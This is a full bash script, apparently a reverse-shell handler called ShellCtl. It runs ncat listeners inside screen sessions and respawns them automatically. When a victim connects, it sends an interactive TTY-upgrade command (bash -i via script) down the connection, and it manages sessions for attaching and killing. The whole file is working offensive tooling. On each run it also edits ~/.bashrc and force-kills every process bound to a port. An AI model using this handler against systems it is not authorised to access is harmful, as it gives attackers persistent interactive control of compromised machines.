#!/bin/bash

#── Colours ────────────────────────────────────────────────────────────────────
RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; YELLOW=$'\033[0;33m'
BLUE=$'\033[0;34m'; CYAN=$'\033[0;36m'; NC=$'\033[0m'

#── Install bash‑completion script (NetCtl style) ──────────────────────────────
install_completion() {
    local comp_dir="$HOME/.bash_completion.d"
    local comp_file="$comp_dir/shellctl-completion.bash"

    if [ ! -f "$comp_file" ]; then
        mkdir -p "$comp_dir"
        cat >"$comp_file" <<'EOF'
_shellctl_completions() {
    local cur prev cmds sessions ports
    COMPREPLY=()
    cur="${COMP_WORDS[COMP_CWORD]}"
    prev="${COMP_WORDS[COMP_CWORD-1]}"
    cmds="list attach kill killall help"

    case "$prev" in
        attach|kill)
            sessions=$(screen -ls | grep -Eo 'shellctl_[0-9]+' 2>/dev/null)
            ports=$(echo "$sessions" | sed 's/shellctl_//g')
            COMPREPLY=( $(compgen -W "$sessions $ports" -- "$cur") )
            ;;
        *)
            COMPREPLY=( $(compgen -W "$cmds" -- "$cur") )
            ;;
    esac
    return 0
}

complete -F _shellctl_completions ShellCtl
complete -F _shellctl_completions ./ShellCtl.sh

EOF
        chmod +x "$comp_file"
        if ! grep -qF "shellctl-completion.bash" ~/.bashrc; then
            {
              echo ""
              echo "# ShellCtl completion"
              echo "if [ -f \"$comp_file\" ]; then"
              echo "  source \"$comp_file\""
              echo "fi"
            } >>~/.bashrc
        fi
        source ~/.bashrc 2>/dev/null
        echo -e "${GREEN}[+] Bash‑completion installed!${NC}"
    fi
}

#── Usage ──────────────────────────────────────────────────────────────────────
show_usage() {
  cat <<EOF
${GREEN}ShellCtl${NC} - Shell Control Script

Usage:
  $0 <port>           Start listener on <port>
  $0 list             List active shell sessions
  $0 attach <session> Attach to a session
  $0 kill <session>   Kill a session
  $0 killall          Kill all sessions
  $0 help             Show this help message
EOF
}

#── Session commands ───────────────────────────────────────────────────────────
list_sessions() {
  local s
  s=$(screen -ls | grep -Eo 'shellctl_[0-9]+' || true)
  if [ -z "$s" ]; then
    echo -e "${YELLOW}[*] No active shell sessions.${NC}"
    return
  fi
  echo -e "${GREEN}[+] Active sessions:${NC}"
  while read -r name; do
    local p=${name##*_}
    echo -e "  ${CYAN}$name${NC} (port ${YELLOW}$p${NC})"
  done <<<"$s"
}

attach_session() {
  local sess=$1
  [[ $sess =~ ^[0-9]+$ ]] && sess="shellctl_$sess"
  if ! screen -ls | grep -q "$sess"; then
    echo -e "${RED}Error:${NC} session $sess not found." && exit 1
  fi
  screen -r "$sess"
}

kill_session() {
  local sess=$1
  [[ $sess =~ ^[0-9]+$ ]] && sess="shellctl_$sess"
  if ! screen -ls | grep -q "$sess"; then
    echo -e "${RED}Error:${NC} session $sess not found." && exit 1
  fi
  screen -S "$sess" -X quit
  local port=${sess##*_}
  lsof -ti :"$port" | xargs -r kill -9
  echo -e "${GREEN}[+] Killed $sess${NC}"
}

kill_all_sessions() {
  local s
  s=$(screen -ls | grep -Eo 'shellctl_[0-9]+' || true)
  if [ -z "$s" ]; then
    echo -e "${YELLOW}[*] No sessions to kill.${NC}"
    return
  fi
  echo -e "${YELLOW}[*] Killing all sessions...${NC}"
  while read -r sess; do
    screen -S "$sess" -X quit
    local p=${sess##*_}
    lsof -ti :"$p" | xargs -r kill -9
  done <<<"$s"
  echo -e "${GREEN}[+] Done.${NC}"
}

#── Inline listener & watcher ─────────────────────────────────────────────────
listener_loop() {
  local PORT=$1 ROWS=$2 COLS=$3
  echo -e "${GREEN}[+] Listener on port $PORT started.${NC}"
  echo -e "${YELLOW}[*] Waiting for connections...${NC}"
    stty -echo raw
    cat <(echo "/bin/bash -c \"export TERM=xterm; \
script -q /dev/null -c 'stty rows $ROWS cols $COLS; clear; bash -i'\"") - \
      | ncat -lvp "$PORT"
    stty sane
    echo -e "${BLUE}[*] Connection ended—restarting...${NC}"
    sleep 1
}

watcher_loop() {
  local PORT=$1 SESSION=$2 ROWS=$3 COLS=$4
  declare -A used; used[1]=1

  while true; do
    # Check whether anything is listening on $PORT
    if ! ss -lnt "( sport = :$PORT )" 2>/dev/null | grep -q LISTEN; then
      # Port is not bound → start a new listener
      local id=1
      while [ -n "${used[$id]}" ]; do ((id++)); done
      used[$id]=1

      echo -e "${GREEN}[+] Port $PORT free — launching Shell-$id${NC}"
      screen -S "$SESSION" -X eval \
        "screen -t Shell-$id bash -lc 'listener_loop $PORT $ROWS $COLS'" \
        "other"
    fi

    sleep 2
  done
}

export -f listener_loop watcher_loop

#── screenrc builder ──────────────────────────────────────────────────────────
create_screenrc() {
  local P=$1 f; f=$(mktemp)
  cat >"$f" <<EOF
defscrollback 5000
startup_message off
vbell off
autodetach on
msgwait 0
hardstatus alwayslastline "%{= kC}[%{C} %w %{kC}] %{= kG}[ %{G}Port: $P %{g}] %= %{= kw}%Y-%m-%d %{W}%c %{g}| %{= kw}CTRL+a %{= kB}a:List %{= kR}k:Kill %{= kY}d:Detach %{= kM}q:Quit"
bind a windowlist -b
bind k kill
bind q quit
# zombie kr
zombie
EOF
  echo "$f"
}

#── Cleanup on exit ───────────────────────────────────────────────────────────
cleanup() {
  echo -e "\n${RED}[!] Cleaning up...${NC}"
  screen -S "shellctl_$PORT" -X quit 2>/dev/null
  lsof -ti :"$PORT" | xargs -r kill -9
  exit 0
}

#── Start the handler (fixed local assignment) ────────────────────────────────
start_handler() {
    local P=$1
    local S="shellctl_${P}"

    command -v ncat >/dev/null 2>&1 || { echo -e "${RED}netcat missing${NC}"; exit 1; }
    command -v screen >/dev/null 2>&1 || { echo -e "${RED}screen missing${NC}"; exit 1; }

    if screen -ls | grep -q "$S"; then
        echo -e "${CYAN}[INFO] Session '$S' already running. Attaching...${NC}"
        screen -r "$S"
        exit 0
    fi

    trap cleanup INT TERM
    local r c; read r c < <(stty size)
    local RC; RC=$(create_screenrc "$P")

    echo -e "${GREEN}[+] Starting on port $P...${NC}"
    screen -c "$RC" -dmS "$S" -t Watcher \
        bash -lc "watcher_loop $P $S $r $c"

    screen -S "$S" -X eval \
        "screen -t Shell-1 bash -lc 'listener_loop $P $r $c'" \
        "other"

    ( sleep 5; rm -f "$RC" ) &
    echo -e "${GREEN}[+] Session: ${CYAN}$S${NC}"
    echo -e "${YELLOW}[*] Reattach: $0 attach $P${NC}"
    sleep 1
    screen -r "$S"
}

#── Main dispatcher ───────────────────────────────────────────────────────────
main() {
  if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    install_completion
  fi

  case "$1" in
    ""|"help") show_usage ;;
    list)       list_sessions ;;
    attach)     [ "$2" ] && attach_session "$2" || show_usage ;;
    kill)       [ "$2" ] && kill_session   "$2" || show_usage ;;
    killall)    kill_all_sessions ;;
    *[0-9]*)    PORT=$1; export PORT; start_handler "$1" ;;
    *)          echo -e "${RED}Unknown cmd: $1${NC}"; show_usage ;;
  esac
}

main "$@"
